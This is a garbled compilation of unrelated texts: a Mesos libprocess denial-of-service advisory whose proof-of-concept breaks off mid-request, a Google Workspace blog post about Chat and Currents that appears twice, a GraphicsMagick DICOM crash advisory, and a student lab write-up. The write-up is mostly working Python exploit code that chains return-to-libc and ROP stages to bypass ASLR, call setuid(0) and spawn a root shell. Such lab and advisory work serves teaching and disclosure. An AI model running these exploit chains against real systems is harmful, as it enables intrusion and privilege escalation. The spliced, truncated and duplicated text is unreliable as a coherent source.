# Denial of Service Vulnerability in Libprocess (CVE-2017-7687)

A vulnerability in the libprocess dependency of Mesos allows a remote attacker to cause a crash in any Mesos component that includes the library. The bug resides in the libprocess message parsing functionality and causes the application to call `abort()` ungracefully when handling malformed libprocess messages.

Severity: High (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:H/RC:C)

Vendor: Apache Software Foundation

Versions Affected:
Apache Mesos <= 1.3.0

## Description

A vulnerability in the libprocess dependency of Mesos allows a remote attacker
to cause a crash in any Mesos component that includes the library. The bug
resides in the libprocess message parsing functionality and causes the
application to call `abort()` ungracefully when handling malformed libprocess
messages.

The vulnerability affects the latest release (1.3.0) of Mesos as well as most
versions before. Importantly, it affects the Master and Agent services that are
exposed over the network. A malicious actor can easily deny allocation of
resources to applications with a single HTTP request to each component.

The bug is found in `parse()` at `libprocess/src/process.cpp` when attempting to
decode URL encoded paths. Particularly, the condition is triggered when trying
to handle the error created when decoding a malformed path.

```
 795   // Decode possible percent-encoded 'to'.
 796   Try<string> decode = http::decode(request.url.path.substr(1, index));
 797
 798   if (decode.isError()) {
 799     return Failure("Failed to decode URL path: " + decode.get());
 800   }

```

If the `Try` object returned from `decode()` is of the error type, it tries to
return a `Failure` object instantiated with a string concatenated with the
results of the `get()` call found in `./3rdparty/stout/include/stout/try.hpp`.

```
 73   const T& get() const
 74   {
 75     if (!data.isSome()) {
 76       assert(error_.isSome());
 77       ABORT("Try::get() but state == ERROR: " + error_.get().message);
 78     }
 79     return data.get();
 80   }
 81
 82   T& get()
 83   {
 84     return const_cast<T&>(static_cast<const Try&>(*this).get());
 85   }

```

Since the `Try` object can only represent one of two states: a value or an error
containing the error string, calling `get()` attempts to retrieve a value that
is not present resulting in the stout library aborting the program without
handling the exception. This stems from improper use of the stout API.

A partial stack trace at the time of the crash is as follows:

```
ABORT: (../../3rdparty/stout/include/stout/try.hpp:77): Try::get() but state == ERROR: Malformed % escape in 'mast%r': '%r'

Thread 10 "mesos-master" received signal SIGABRT, Aborted.

```
## Mitigation

The fix for this error is simple. Simply replace the errorenous `get()` call
with `error()`.

## Proof of Concept

Sending the following HTTP request causes Mesos master and agent to crash.

```

Host: 127.0.0.1:5050
User-Agent: libprocess/test
Content-type: application/json

[## Updates](/.)

This official feed from the Google Workspace team provides essential information about new features and improvements for Google Workspace customers.

## [New community features for Google Chat and an update on Currents](http://workspaceupdates.googleblog.com/2023/04/new-community-features-for-google-chat-and-an-update-currents%20.html "New community features for Google Chat and an update on Currents ")

Wednesday, April 12, 2023

**Note:**This blog post outlines upcoming changes to Google Currents for Workspace users. For information on the previous deprecation of Google+ for users with personal Google accounts, please [see this post](https://blog.google/technology/safety-security/expediting-changes-google-plus/).
### ---

### What's Changing

Last year, we **[announced plans to wind down Currents](https://workspaceupdates.googleblog.com/2022/02/currents-spaces-migration.html)**, to focus efforts on community experiences that are better integrated with the rest of Google Workspace. To help our customers manage this transition, we published [detailed guidance](https://support.google.com/a/answer/13137538) for Workspace administrators and enabled customers to opt-in for [automated migration of Currents data](https://support.google.com/a/answer/12129320?p=currentsfaq&visit_id=637801097348316846-2249159324&rd=2) to spaces in Google Chat.

We are nearing the end of this transition. Beginning July 5, 2023, Currents will no longer be available. Workspace administrators can [export Currents data using Takeout](https://support.google.com/a/answer/100458) before August 8, 2023. Beginning August 8th, Currents data will no longer be available for download.

Although we are saying goodbye to Currents, we continue to invest in new features for [Google Chat](https://chat.google.com/), so teams can connect and collaborate with a shared sense of belonging. Over the last year, we've delivered features designed to support community engagement at scale, and will continue to deliver more. Here is a summary of the features with additional details below: [![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEil-tQSvWkISdvbujn818sEroZRYYKpRGceE-TwpWRdVewQPlU0imIwcmg0yno39j1pZ-zoJgqmivcU0Sip6hAyaceJ4f488VTs_9tsqXZC15AlQZOxx4QPIGkS0HxkcOGSkG3BSGLRzdoXKHq9mmvfwaF5t011Gi_VPQ7DxrtpCgu7M5sODOd-XciE/s16000/GWS_Timeline_Chrono_LINKS%20(2).png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEil-tQSvWkISdvbujn818sEroZRYYKpRGceE-TwpWRdVewQPlU0imIwcmg0yno39j1pZ-zoJgqmivcU0Sip6hAyaceJ4f488VTs_9tsqXZC15AlQZOxx4QPIGkS0HxkcOGSkG3BSGLRzdoXKHq9mmvfwaF5t011Gi_VPQ7DxrtpCgu7M5sODOd-XciE/s2074/GWS_Timeline_Chrono_LINKS%20%282%29.png)
This month, we’re enabling **new ways for organizations to share information** across the enterprise with [announcements in Google Chat](http://workspaceupdates.googleblog.com/2023/04/announcements-in-google-chat.html). This gives admin controls to limit permissions for posting in a space, while enabling all members to read and react, helping ensure that important updates stay visible and relevant. Later this year, we plan to simplify membership management by integrating Google Groups with spaces in Chat, enable post-level metrics for announcements, and provide tools for Workspace administrators to manage spaces across their domain.

We’ve already rolled out **new ways to make conversations more expressive and engaging** such as [in-line threading](https://workspaceupdates.googleblog.com/2022/10/in-line-threading-in-Chat-spaces.html) to enable rich exploration of a specific topic without overtaking the main conversation and [custom emojis](https://workspaceupdates.googleblog.com/2022/10/custom-emojis-google-chat.html) to enable fun, personal expression.

We’ve also made it easier for individuals to **discover and join communities of shared interest**. By [searching in Gmail](https://workspaceupdates.googleblog.com/2022/08/chat-spaces-search-in-gmail.html), users can explore a directory of available spaces covering topics of personal or professional interest such as gardening, pets, career development, fitness, cultural identity, and more, with the ability to [invite others to join](https://workspaceupdates.googleblog.com/2022/03/share-spaces-in-google-chat.html) via link. Last year, we increased [the size of communities supported by spaces in Chat to 8,000 members](https://workspaceupdates.googleblog.com/2022/07/building-larger-spaces-in-google-chat%20.html), and we are working to scale this in a meaningful way later this year.

As communities grow, it’s essential to provide **tools for content moderation and data management**. Last year, we introduced [space managers](https://workspaceupdates.googleblog.com/2022/02/define-and-manage-chat-spaces-space.html), a community lead with [abilities](https://workspaceupdates.googleblog.com/2023/03/new-space-manager-capabilities-google-chat.html) to [moderate conversation](https://workspaceupdates.googleblog.com/2023/03/new-space-manager-capabilities-google-chat.html) and [manage membership](https://workspaceupdates.googleblog.com/2023/01/improved-membership-management-google-chat-spaces.html), and last year at NEXT, we rolled out [data loss prevention](https://workspaceupdates.googleblog.com/2022/10/data-loss-prevention-google-chat-generally-available.html) (DLP) for Chat. We will continue to enhance community health and data security for Google Chat.

Our partner community is extending the power of Chat through **integrations with essential third-party apps** such as [Jira, GitHub, Asana, PagerDuty](https://developers.googleblog.com/2023/03/how-to-be-more-productive-as-developer-5-app-integrations-for-google-chat-that-can-help.html), [Zendesk and Salesforce](https://workspaceupdates.googleblog.com/2023/02/release-notes-02-24-2023.html). Many organizations have **built custom workflow apps using low-code and no-code tools**, and we anticipate that this number will continue to grow with the GA releases of the Chat API and AppSheet’s Chat app building capabilities later this year.

For teams to thrive in this rapidly changing era of hybrid work, it’s essential to build authentic personal connections and a strong sense of belonging, no matter when or where individuals work. We will continue to make Google Chat the best option for Workspace customers seeking to build a community and culture for hybrid teams, with much more to come later this year.

This writeup describes my solution to an assignment for school requiring us to
exploit a classic buffer overflow to gain a shell using return-to-libc
techniques.

The original brief allowed for Address Space Layout Randomisation (ASLR) to be
turned off but I decided to attempt the challenge of bypassing ASLR. I present
a technique using named pipes to ensure better reliability of the exploit.

# Vulnerable Program

We were given the following vulnerable program. Notice that the input comes from
reading a file then triggering the bug instead of reading from a stream like
STDIN. This mounts a few issues with the lack of blocking for user input since
bypassing ASLR requires a leak before supplying calculated libc addresses in a
stage two payload.

One option is to leverage a race condition to write the calculated addresses to
the file before it is read a second time but this is not reliable and requires
multiple attempts for the exploit to work. In the following sections, a
technique using named pipe is explained.

```
/* retlib.c */
/* This program has a buffer overflow vulnerability. */
/* Our task is to exploit this vulnerability */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

unsigned int xormask = 0xBE;
int i, length;

int bof(FILE *badfile)
{
    char buffer[12];

    /* The following statement has a buffer overflow problem */
    length = fread(buffer, sizeof(char), 52, badfile);

    /* XOR the buffer with a bit mask */
    for (i=0; i<length; i++) {
        buffer[i] ^= xormask;
    }

    return 1;
}

int main(int argc, char **argv)
{
    FILE *badfile;

    badfile = fopen("badfile", "r");
    bof(badfile);

    printf("Returned Properly\n");

    fclose(badfile);

    return 1;
}

```
# Environment and Tools

## 1. Install Ubuntu 14.04 x86

In this assignment, Ubuntu 14.04 x86 is used with vagrant.

```
$ vagrant init ubuntu/trusty32
$ vagrant up

```
## 2. Install Python and Pwntools

The exploit will be written in python using the pwntools framework. Pwntools is
a framework for exploit development and enables rapid prototyping as well as
debugging. Additionally, `ropper`, a tool to search for ROP gadgets within a
given binary is installed.

```
$ sudo apt-get update
$ sudo apt-get upgrade
$ sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev
build-essential
$ sudo pip install --upgrade pip
$ sudo pip install --upgrade pwntools
$ sudo pip install --upgrade ropper

```
# Description of the Vulnerability

In this brief section, the vulnerability is explained and the very bare minimum
is demonstrated to obtain instruction pointer control to lay the foundation for
the other two sections.

The vulnerable function is listed as:

```
int bof(FILE *badfile)
{
	char buffer[12];

	/* The following statement has a buffer overflow problem */
	length = fread(buffer, sizeof(char), 52, badfile);

	/* XOR the buffer with a bit mask */
	for (i=0; i<length; i++) {
		buffer[i] ˆ= xormask;
	}

	return 1;
}

```

User input is read from the open file handle passed in the arguments into the
`char *` buffer. Since 52 bytes are read from the file into a buffer of size 12,
a classic stack overflow occurs. The payload has to be encoded as an
exclusive-or (XOR) of every byte against `0xbe`, the xor mask.

```
gef➤  r
Starting program: /vagrant/assignment1/retlib

Program received signal SIGSEGV, Segmentation fault.
0x61616167 in ?? ()
gef➤  pattern search 0x61616167
[+] Searching '0x61616167'
[+] Found at offset 24 (little-endian search) likely
[+] Found at offset 21 (big-endian search)
gef➤

```

Since the offset in which the EIP control occurs is at 24, the amount of space
that can be used for the ROP chain is `(52 - 24)/8` which is 7 values on a 32
bit operating system.

## Stack Diagrams

Before calling the vulnerable function `bof`, the caller `main` pushes the
`FILE * badfile` argument onto the stack. Next, when the `bof` function is called
into, the return address is pushed onto the stack.

```
 8048554:    89 44 24 1c              mov    %eax,0x1c(%esp)
 8048558:    8b 44 24 1c              mov    0x1c(%esp),%eax
 804855c:    89 04 24                 mov    %eax,(%esp)
 804855f:    e8 59 ff ff ff           call   80484bd <bof>

```

Within the `bof` function, the function prologue pushes the current EBP onto the
stack. This is the saved EBP. Next, 0x28 bytes are allocated for the `bof` stack
frame.

```
 80484bd:    55                       push   %ebp
 80484be:    89 e5                    mov    %esp,%ebp
 80484c0:    83 ec 28                 sub    $0x28,%esp

```

If we draw a diagram, one might notice that the `buffer` character buffer is
given 16 bytes of space instead of 12 as per the declaration. This is due to
GCC’s alignment of variables to 8 bytes.

# Task 1

While the assignment brief indicates for the exploit to work under the absence
of the Address Space Layout Randomisation defense, this report will offer an
exploit that works in the presence of the defense as a challenge. To do this, we
will employ return to procedure linkage table techniques to leak randomised
addresses within libc.

## Blocking Stream Mechanism

First, if we ran the program against an exploit `badfile`, it is immediately
apparent that there is no way to interact with the program while it is executing
because all it does is read a file. Furthermore, if we take a look at the list
of imported functions from libc, we do not have a function in the procedure
linkage table to perform reads from `stdin` to make it easy for a multiple stage
exploit.

```
$ objdump -t retlib | grep @@GLIBC
00000000       F *UND*    00000000              fclose@@GLIBC_2.1
00000000       F *UND*    00000000              fread@@GLIBC_2.0
00000000       F *UND*    00000000              puts@@GLIBC_2.0
00000000       F *UND*    00000000              __libc_start_main@@GLIBC_2.0
00000000       F *UND*    00000000              fopen@@GLIBC_2.1

```

From the above, `fread` is the only possible function that can be used to read
data from the attacker. It has the following signature: `fread(void *restrict
ptr, size_t size, size_t nitems, FILE *restrict stream)`. Unfortunately, it
would be remarkably difficult to obtain a valid `FILE` pointer at the point of
the overflow. Furthermore, we would probably have to set up a fake stack with a
larger read and a stack pivot because the ROP chain can only hold seven
four-byte values.

To solve this problem, a unix mechanism called named pipes is used. Named pipes
are typically used to perform inter-process communication. Two processes can
open the named pipe, which exists as a file on the file system. One end is used
to write to the named pipe and the other reads from it.

To demonstrate, a named pipe can be created in the `/tmp/` directory.

```
/tmp/:$ mkfifo badfile
/tmp/:$

```

Next, the `retlib` binary is run. The binary blocks on input.

```
/tmp/:$ /vagrant/assignment1/retlib

```

Next, a 101 bytes of data is written into the named pipe, which in turn is
received by the `retlib` binary.

```
/tmp/:$ python -c 'print "A"*100' > /tmp/badfile
/tmp/:$

```

Back in the `retlib` run, it crashes with a segmentation fault.

```
$ /vagrant/assignment1/retlib
Segmentation fault (core dumped),

```

The important feature about the named pipe is that a process that supplied the
initial buffer overflow payload can continue to interact with the `retlib`
binary. This is exactly the behaviour desired when writing a multistage exploit.

To begin with, we can create a skeleton exploit script to setup the named pipe
and interact with the `retlib` binary.

```
from pwn import *
import os
import posix

def main():

    # Get the absolute path to retlib
    retlib_path = os.path.abspath("./retlib")

    # Change the working directory to tmp and create a badfile
    # This is to avoid problems with the shared directory in vagrant
    os.chdir("/tmp")

    # Create a named pipe to interact reliably with the binary
    try:
        os.unlink("badfile")
    except:
        pass
    os.mkfifo("badfile")

    # Start the process
    p = process(retlib_path)

    # Open a handle to the input named pipe
    comm = open("badfile", 'w', 0)

    # Setup the payload
    payload  = "A"*24
    payload += p32(0xdeadbeef)
    payload  = payload.ljust(52, "\x90")
    payload  = xor(payload, 0xbe)

    # Send the payload
    comm.write(payload)

    p.interactive()

if __name__ == "__main__":
    main()

```

Demonstrating that it works:

```
$ python task1-skeleton.py
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[+] Starting local process '/vagrant/assignment1/retlib': pid 6899

$ dmesg | tail -n 1

```
## Leaking Libc Base

Next, an address into libc has to be leaked before the randomised libc base
address can be calculated. Once the base address is known, the address of any
function in libc can be derived and used in the return to libc ROP chain. To do
this, a technique called return to Procedure Linkage Table (ret2plt) is employed
to leak these addresses.

The Procedure Linkage Table is used in conjunction with the Global Offset Table
to implement dynamic linkage of shared libraries. For a full description of how
dynamic libraries work in ELF files, please take a look at the following link:
<https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html>.

A function call in the PLT begins with a PLT stub. The `puts` stub has the
following disassembly. It implements the *lazy binding* behaviour by beginning
the stub with a redirection in the form of a `jmp *0x804a014`.

```
08048380 <puts@plt>:
 8048380:    ff 25 14 a0 04 08        jmp    *0x804a014
 8048386:    68 10 00 00 00           push   $0x10
 804838b:    e9 c0 ff ff ff           jmp    8048350 <_init+0x24>

```

The initial memory content of the `0x804a014` address is `0x08048386`, the
address of one instruction after the `jmp`.

```
gef➤  x/xw 0x804a014
0x804a014 <[[email protected]](/cdn-cgi/l/email-protection)>:    0x08048386

```

The code initialises the address of `puts` in libc into the GOT before
returning. After the initialisation, the GOT entry now contains a randomised
libc address.

```

```

Thus, if we call `puts` in PLT with the address of `puts` in the GOT, we can
leak the resolved libc address. The following code snippet creates a ROP chain
to `puts` the libc address of `puts` and then crash. The python script will
receive the leaked address in `stdout`, unpack the raw bytes into a 32 bit
integer value, and display it.

```
...
puts_plt = 0x08048380
puts_got = 0x804a014
...
    # Create the rop chain
    rop  = p32(puts_plt)
    rop += p32(0xdeadbeef)
    rop += p32(puts_got)
...
    # Get leak of puts in libc
    leak = p.recv(4)
    puts_libc = u32(leak)
    log.info("puts@libc: 0x%x" % puts_libc)
    p.clean()
...

```

The next step would be to obtain some important offsets of values and functions
within the raw libc shared object to calculate the libc base and other useful
libc functions. To do this, we can use the libc-database tool by Niklas
Baumstark
(<https://github.com/niklasb/libc-database>).

```
$ ldd /vagrant/assignment1/retlib
    linux-gate.so.1 =>  (0xb77d0000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7614000)
    /lib/ld-linux.so.2 (0xb77d1000)
$ ./identify /lib/i386-linux-gnu/libc.so.6
id libc6_2.19-0ubuntu6.13_i386
$ ./dump libc6_2.19-0ubuntu6.13_i386
offset___libc_start_main_ret = 0x19af3
offset_system = 0x00040310
offset_dup2 = 0x000ddd80
offset_read = 0x000dd3c0
offset_write = 0x000dd440
offset_str_bin_sh = 0x162cec
offset_setuid = 0x000b91a0
offset_puts = 0x000657e0
offset_exit = 0x00033260

```

Now, a small addition to the python script would allow us to make some important
calculations.

```
    # Calculate the required libc functions
    libc_base = puts_libc - offset_puts
    system_addr = libc_base + offset_system
    binsh_addr = libc_base + offset_str_bin_sh
    exit_addr = libc_base + offset_exit

```

Running the updated script:

```

```
## Second Stage Payload

Now that we have the libc addresses of `system`, `exit`, and the string
`"/bin/sh"`, we can craft a ROP chain for the second stage payload. However, we
need a way to get the second stage ROP chain executed. The simplest solution to
this is to loop back into the main function which would re-trigger the
vulnerability with the new faked stack frames.

```
...
    # Create the rop chain
    rop  = p32(puts_plt)
    rop += p32(main_addr)
    rop += p32(puts_got)

    # Create and encode the payload
    payload = "A"*24 + rop
    payload = payload.ljust(52, "\x90")
    payload = xor(payload, 0xbe)

    # Launch the first stage of the attack
    comm.write(payload)
    log.info("Stage 1 sent!")
...
    # Create the rop chain for stage 2
    rop2  = p32(system_addr)
    rop2 += p32(exit_addr)
    rop2 += p32(binsh_addr)

    # Create and encode the payload for stage 2
    payload2 = "A"*24 + rop2
    payload2 = payload2.ljust(52, "\x90")
    payload2 = xor(payload2, 0xbe)

    # Launch the second stage of the attack
    comm.write(payload2)
    log.info("Stage 2 sent!")
...

```

# Task 2

In task 2, we have to execute `system("/bin/bash")` in the ROP chain. However,
the caveat is that `/bin/bash` drops root privileges so the shell that gets
spawned only has user level privileges. To get around this, `setuid(0)` has to
be executed to set the effective user ID before calling `system`.

A second caveat is that the string `"/bin/bash"` does not exist within the
`retlib` binary or the libc shared library. Thus, we would need to read the
string into memory at some writable address.

To surmise, the following series of actions must be taken:

1. Leak the libc addresses
2. `setuid(0)`
3. Read `"/bin/bash"` into memory
4. `system("/bin/bash")`

## Libc Address Leak

First, we leak the `puts` libc address as per task 1 and calculate a few more
important function addresses that we need for the entire task.

```
    # Calculate the required libc functions
    libc_base = puts_libc - offset_puts
    system_addr = libc_base + offset_system
    binsh_addr = libc_base + offset_str_bin_sh
    setuid_addr = libc_base + offset_setuid
    exit_addr = libc_base + offset_exit
    read_addr = libc_base + offset_read
    writable_addr = libc_base + offset_writable

    log.info("libc base: 0x%x" % libc_base)
    log.info("system@libc: 0x%x" % system_addr)
    log.info("setuid@libc: 0x%x" % setuid_addr)
    log.info("exit@libc: 0x%x" % exit_addr)
    log.info("read@libc: 0x%x" % read_addr)
    log.info("writable address in libc: 0x%x" % writable_addr)

```
## Pop Ret ROP Gadgets

Next, we need Pop Ret gadgets, a class of ROP gadgets that aid with ROP chains
that use functions with multiple arguments. The gadgets pop values off the stack
to move the stack pointer in the right position to the next fake stack frame.

To do this, the `ropper` binary can be used to search for these addresses:

```
$ ropper --file retlib --search "pop %"
[INFO] Load gadgets from cache
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop %

[INFO] File: retlib
0x08048441: pop ds; add eax, edx; sar eax, 1; jne 0x449; ret;
0x080485ef: pop ebp; ret;
0x080485ec: pop ebx; pop esi; pop edi; pop ebp; ret;
0x0804834d: pop ebx; ret;
0x080485ee: pop edi; pop ebp; ret;
0x080485ed: pop esi; pop edi; pop ebp; ret;

```

We need a `pop ret` gadget and a `pop pop pop ret` gadget. Thus, we pick
`0x0804834d` and `0x080485ed`.

## Setting the User ID

We split up the actions we have to take into multiple stages. The ROP chain to
call `setuid(0)` is as follows:

```
    # Create the rop chain for stage 2
    rop2  = p32(setuid_addr)
    rop2 += p32(popret)
    rop2 += p32(0)
    rop2 += p32(main_addr)

    # Create and encode the payload for stage 2
    payload2 = "A"*24 + rop2
    payload2 = payload2.ljust(52, "\x90")
    payload2 = xor(payload2, 0xbe)

    # Launch the second stage of the attack
    comm.write(payload2)
    log.info("Stage 2 sent!")

```
## Reading Bash String into Memory

To get the string `"/bin/bash"` into memory, we find a valid address to write to
in libc. The offset `0x1ad050` into libc is writable and so we pick that. Now,
we can craft a ROP chain that calls `read(0, 0x1ad050, 10)` to read 10 bytes
from `stdin`.

```
    # Create the rop chain for stage 3
    rop3  = p32(read_addr)
    rop3 += p32(pppret)
    rop3 += p32(0)
    rop3 += p32(writable_addr)
    rop3 += p32(10)
    rop3 += p32(main_addr)

    # Create and encode the payload for stage 3
    payload3 = "A"*24 + rop3
    payload3 = payload3.ljust(52, "\x90")
    payload3 = xor(payload3, 0xbe)

    # Launch the third stage of the attack
    comm.write(payload3)
    log.info("Stage 3 sent!")

    # Provide the /bin/bash string
    p.send("/bin/bash\x00")
    log.info("\"/bin/bash\": 0x%x" % writable_addr)

```
## Calling System

The ROP chain to call `system("/bin/bash")` is almost identical to the one in
task 1.

```
    # Create the rop chain for stage 4
    rop4  = p32(system_addr)
    rop4 += p32(exit_addr)
    rop4 += p32(writable_addr)

    # Create and encode the payload for stage 4
    payload4 = "A"*24 + rop4
    payload4 = payload4.ljust(52, "\x90")
    payload4 = xor(payload4, 0xbe)

    # Launch the fourth stage of the attack
    comm.write(payload4)
    log.info("Stage 4 sent!")

```

# Task 3

## Address Space Layout Randomisation

Since the exploit works by leaking libc address from the Global Offset Table,
Address Space Layout Randomisation does not mitigate it. Thus, running the
exploit in task 1 results in a successful shell.

```

```
## Stack Canaries

Since the vulnerability stems from a buffer overrun, introducing a stack canary
to detect corruption of the stack frame will prevent the attacker from
controlling the instruction pointer without having an information leak. The
exploit in task 1 has no such capability and thus, will fail.

Unfortunately, the binary does not grant such an information leak so there is no
way to write a reliable exploit to get a shell.

A null pointer dereference vulnerability in the GraphicsMagick DICOM image
decoder allows an attacker to cause a denial-of-service condition or other
unspecified impact.

## Affected Versions

The current release (1.3.26) is affected. Further analysis is required to
determine which versions are also affected by the vulnerability.

## Vulnerability Scores

* Classification: CWE-476: NULL Pointer Dereference
* CVSSv3: 5.3
  (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)

## Description

The null pointer dereference happens in the function `ReadDCMImage` of the file
`coders/dcm.c`. The `Image * image` pointer contains the value `0`. Since the
dereference `image->previous` attempts to access the memory address `0x1a40`
(0x1a40 being the offset of the `previous` field), the program segfaults.

```
4603 static Image *ReadDCMImage(const ImageInfo *image_info,ExceptionInfo
     *exception)
4604 {
...
4853   if (status == MagickPass)
4854     {
4855       while (image->previous != (Image *) NULL)
4856         image=image->previous;
4857       CloseBlob(image);
4858       return(image);
4859     }
...
4865 }

```

The `image` pointer is set to null in this call to `DCM_ReadNonNativeImages`.

```
4603 static Image *ReadDCMImage(const ImageInfo *image_info,ExceptionInfo
     *exception)
4604 {
...
4686     else if ((dcm.transfer_syntax != DCM_TS_IMPL_LITTLE) &&
4687              (dcm.transfer_syntax != DCM_TS_EXPL_LITTLE) &&
4688              (dcm.transfer_syntax != DCM_TS_EXPL_BIG) &&
4689              (dcm.transfer_syntax != DCM_TS_RLE))
4690       {
4691         status=DCM_ReadNonNativeImages(&image,image_info,&dcm,exception);
4692         dcm.number_scenes=0;
4693       }
...
4865 }

```

This is due to an edge case in the function `DCM_ReadNonNativeImages` from the
file `coders/dcm.c`. If the `dcm->number_scenes` field is 0, the entire for loop
is skipped and the `image` pointer is set to NULL.

```
4414 static MagickPassFail DCM_ReadNonNativeImages(Image **image,
     const ImageInfo *image_info,DicomStream *dcm,ExceptionInfo *exception)
4415 {
...
4439   image_list=(Image *)NULL;
...
4448   for (scene=0; scene < dcm->number_scenes; scene++)
4449     {
...
4566     }
4567   DestroyImage(*image);
4568   *image=image_list;
4569   return status;
4570 }

```
## Mitigation

A simple fix could be to place a check that `image` is non-null before
dereferencing `image` in the `ReadDCMImage` function.

```
4603 static Image *ReadDCMImage(const ImageInfo *image_info,ExceptionInfo
     *exception)
4604 {
...
4853   if (status == MagickPass)
4854     {
4855       while (image != (Image *) NULL && image->previous != (Image *) NULL)
4856         image=image->previous;
4857       CloseBlob(image);
4858       return(image);
4859     }
...
4865 }

```

Running the command `gm identify` on the crash file yields an abort from an
exeception generated by a segmentation fault.

```
$ gm identify crash.dcm
gm identify: abort due to signal 11 (SIGSEGV) "Segmentation Fault"...
Aborted (core dumped)

```

## [New community features for Google Chat and an update on Currents](http://workspaceupdates.googleblog.com/2023/04/new-community-features-for-google-chat-and-an-update-currents%20.html "New community features for Google Chat and an update on Currents ")

Wednesday, April 12, 2023

**Note:**This blog post outlines upcoming changes to Google Currents for Workspace users. For information on the previous deprecation of Google+ for users with personal Google accounts, please [see this post](https://blog.google/technology/safety-security/expediting-changes-google-plus/).
### ---

### What's Changing

Last year, we **[announced plans to wind down Currents](https://workspaceupdates.googleblog.com/2022/02/currents-spaces-migration.html)**, to focus efforts on community experiences that are better integrated with the rest of Google Workspace. To help our customers manage this transition, we published [detailed guidance](https://support.google.com/a/answer/13137538) for Workspace administrators and enabled customers to opt-in for [automated migration of Currents data](https://support.google.com/a/answer/12129320?p=currentsfaq&visit_id=637801097348316846-2249159324&rd=2) to spaces in Google Chat.

We are nearing the end of this transition. Beginning July 5, 2023, Currents will no longer be available. Workspace administrators can [export Currents data using Takeout](https://support.google.com/a/answer/100458) before August 8, 2023. Beginning August 8th, Currents data will no longer be available for download.

Although we are saying goodbye to Currents, we continue to invest in new features for [Google Chat](https://chat.google.com/), so teams can connect and collaborate with a shared sense of belonging. Over the last year, we've delivered features designed to support community engagement at scale, and will continue to deliver more. Here is a summary of the features with additional details below: [![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEil-tQSvWkISdvbujn818sEroZRYYKpRGceE-TwpWRdVewQPlU0imIwcmg0yno39j1pZ-zoJgqmivcU0Sip6hAyaceJ4f488VTs_9tsqXZC15AlQZOxx4QPIGkS0HxkcOGSkG3BSGLRzdoXKHq9mmvfwaF5t011Gi_VPQ7DxrtpCgu7M5sODOd-XciE/s16000/GWS_Timeline_Chrono_LINKS%20(2).png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEil-tQSvWkISdvbujn818sEroZRYYKpRGceE-TwpWRdVewQPlU0imIwcmg0yno39j1pZ-zoJgqmivcU0Sip6hAyaceJ4f488VTs_9tsqXZC15AlQZOxx4QPIGkS0HxkcOGSkG3BSGLRzdoXKHq9mmvfwaF5t011Gi_VPQ7DxrtpCgu7M5sODOd-XciE/s2074/GWS_Timeline_Chrono_LINKS%20%282%29.png)
This month, we’re enabling **new ways for organizations to share information** across the enterprise with [announcements in Google Chat](http://workspaceupdates.googleblog.com/2023/04/announcements-in-google-chat.html). This gives admin controls to limit permissions for posting in a space, while enabling all members to read and react, helping ensure that important updates stay visible and relevant. Later this year, we plan to simplify membership management by integrating Google Groups with spaces in Chat, enable post-level metrics for announcements, and provide tools for Workspace administrators to manage spaces across their domain.

We’ve already rolled out **new ways to make conversations more expressive and engaging** such as [in-line threading](https://workspaceupdates.googleblog.com/2022/10/in-line-threading-in-Chat-spaces.html) to enable rich exploration of a specific topic without overtaking the main conversation and [custom emojis](https://workspaceupdates.googleblog.com/2022/10/custom-emojis-google-chat.html) to enable fun, personal expression.
[![A space in Google Chat with in-line threaded conversations.](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheDeR8Wbcdh0c27kzsVZIPXvD8RKbQJbMGfcavv7r0blV7h_ucE7atzhP5uTqg72tPO7fzHKKD13ONmqhmdY-YeMJ5KEG8gYqGCGxKDosKNjZc1jrv7fg2AdYWqs8w1RASDVRZBNizwZGZBKZh7Xbbfhl4qWdMTwx1WDlZ2q9s6Je27WRV4A4FPep-/s16000/unnamed%20(2).png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheDeR8Wbcdh0c27kzsVZIPXvD8RKbQJbMGfcavv7r0blV7h_ucE7atzhP5uTqg72tPO7fzHKKD13ONmqhmdY-YeMJ5KEG8gYqGCGxKDosKNjZc1jrv7fg2AdYWqs8w1RASDVRZBNizwZGZBKZh7Xbbfhl4qWdMTwx1WDlZ2q9s6Je27WRV4A4FPep-/s1600/unnamed%20%282%29.png)*In-line threaded conversations*

[![Creating a custom emoji in Google Chat on a mobile device.](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfryVhyDpTnax8mz-7E9w8YkjMz4VrGBoFIcCjXlFn-2g3H-KTZ8QXIPF7U3HLCMsrlaha5MR6KM8GZ0CRquuBZ0InZ5mfaGuyNjzM-0JyzOr5QfdhEwCY5cpyRCwokEPSplZRFieoDZ3rAnLHgGBtAJKIO_1Y2OeHvuG9IHXNyZus3V1U_KO3J_Ds/w640-h360/c3.gif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfryVhyDpTnax8mz-7E9w8YkjMz4VrGBoFIcCjXlFn-2g3H-KTZ8QXIPF7U3HLCMsrlaha5MR6KM8GZ0CRquuBZ0InZ5mfaGuyNjzM-0JyzOr5QfdhEwCY5cpyRCwokEPSplZRFieoDZ3rAnLHgGBtAJKIO_1Y2OeHvuG9IHXNyZus3V1U_KO3J_Ds/s960/c3.gif)*Discover and join communities with up to 8,000 members*

We’ve also made it easier for individuals to **discover and join communities of shared interest**. By [searching in Gmail](https://workspaceupdates.googleblog.com/2022/08/chat-spaces-search-in-gmail.html), users can explore a directory of available spaces covering topics of personal or professional interest such as gardening, pets, career development, fitness, cultural identity, and more, with the ability to [invite others to join](https://workspaceupdates.googleblog.com/2022/03/share-spaces-in-google-chat.html) via link. Last year, we increased [the size of communities supported by spaces in Chat to 8,000 members](https://workspaceupdates.googleblog.com/2022/07/building-larger-spaces-in-google-chat%20.html), and we are working to scale this in a meaningful way later this year.

